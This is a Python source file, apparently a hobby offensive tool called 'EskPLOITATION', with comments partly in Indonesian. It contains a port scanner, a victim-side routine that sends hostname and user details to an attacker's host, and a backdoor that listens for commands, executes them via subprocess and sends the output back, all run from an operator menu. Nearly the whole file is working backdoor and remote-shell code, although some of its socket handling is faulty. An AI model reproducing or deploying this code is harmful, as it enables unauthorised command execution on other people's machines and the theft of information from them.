import requests as req
import json
from colorama import init
from colorama import Fore, Back, Style
import requests as req
import socket
import time
import getopt
import sys
import subprocess as sub
from os import system

#Template
URL = "192.168.136.128"
PORT = 0
INTERFACE = False
LISTEN = False
ENUM = ""
#List
JSON_LIST = open("./ports.lists.json","r")
Read_File = JSON_LIST.read()
LIST_PORT = json.loads(Read_File) #Bentuk dict

def Port_Finder(start,end,verbose):
    global LIST,PORT
    PORT+=1
    print("Scanning Port..")
    time.sleep(1)
    for port in range(start,end):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            result = sock.connect_ex((URL, port))
            sock.settimeout(0.1)
            if(result == 0):
                print(Fore.GREEN," [!] Open ",port,end=" ")
                print(Fore.WHITE," = ",LIST_PORT[str(port)][0]['description'])
            elif verbose:
                print(Fore.RED," [X] ",port)
        except Exception:
            pass
        sock.close()
def backdoor_active():
    global URL,PORT
    PORT+=1
    print("Port Active : ",PORT,end="\n")
    while True:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.bind((URL,PORT))
        sock.listen(2)
        print("Backdooring Active")
        client_socket, addr = sock.accept()
        while True:
            try:
                buffer = client_socket.recv(4096)
                if len(buffer) > 0:
                    command = buffer.decode()
                    print(command)
                    result = sub.getoutput(command)
                    send_enumerate_to_attacker(result) 
            except:
                pass
            sock.close()
def send_enumerate_to_attacker(result):
    global URL,PORT
    PORT+=1
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((URL, PORT))
    sock.send(result.encode()) 
    sock.close()
def send_enumerate(): #this method run by server, and will send information to attacker
    global URL,PORT
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((URL, PORT))
    result = sub.getoutput('(hostnamectl && whoami)') #yeet command enumaration
    sock.send(result.encode()) #ngirim semua enumaration
    sock.close()
    backdoor_active()
def receive_enumerate():
    global URL,PORT
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.bind((URL,PORT))
    sock.listen(400) #worst case cuman 2 user aja yang ngirim
    print("Listening..")    
    client_socket, addr = sock.accept()
    print("Connected From {}:{}".format(addr[0],addr[1]))
    while True:
        try:
            buffer = client_socket.recv(4096)
            if len(buffer) > 0:
                system("clear")
                print("Success Get Response and this information from victim:")
                print(buffer.decode())
                sock.close()
                init()
                break
        except:
            pass
    menu()
def Init():
    global URL
    currentURL = "http://"+URL
    result = req.get(currentURL)
    print("Requested to {}".format(currentURL))
    print("Server Type: "+result.headers['Server'])
def Access_backdoor():
    global URL,PORT
    PORT+=1
    print("Port Active : ",PORT,end="\n")
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((URL, PORT))
    while True:
        command = input("Command[Exit for back]: ")
        if command == "Exit" or command == "exit":
            sock.close()
            return
        sock.send(command.encode()) #ngirim semua enumaration
        receive_result_backdoor()
def receive_result_backdoor():
    global URL,PORT
    PORT+=1
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.bind((URL,PORT))
    sock.listen(2) #worst case cuman 2 user aja yang ngirim
    print("Result: ")    
    client_socket, addr = sock.accept()
    while True:
        try:
            buffer = client_socket.recv(4096)
            if len(buffer) > 0:
                system("clear")
                print("Success Get Response and this information from victim:")
                print(buffer.decode())
                break
        except:
            pass
    sock.close()
def menu():
    global ENUM
    while True:
        print("====EskPLOITATION====")
        print("1. Scan Port")
        print("2. Access Backdoor Shell")
        print("3. Get Enumerate")
        choose = int(input("> "))
        if(choose == 1):
            Port_Finder(0,3600,True)
            
        elif(choose == 2):
            Access_backdoor()
            
        elif(choose == 3):
            print(ENUM)
            input("")
def main():
    global URL,PORT,INTERFACE,LISTEN
    system("clear")
    if len(sys.argv) == 1:
        print("Wrong Command Please Use option -H or --host <Host> -P or --port <Port> [-I or --interface] [-L or --listen]")
        return
    options, args = getopt.getopt(sys.argv[1:], "H:P:IL", ["host=", "port=", "interface"])
    for opt, arg in options:
        if opt in ('-H', '--host'):
            URL = arg
        elif opt in ('-P', '--port'):
            PORT = int(arg)
        elif opt in ('-I', '--interface'):
            INTERFACE = True
        elif opt in ('-L', '--listen'):
            LISTEN = True
        
    if INTERFACE:
        menu()
    elif LISTEN:
        receive_enumerate()
    else:
        send_enumerate()
    
    
if __name__ == "__main__":
    main()

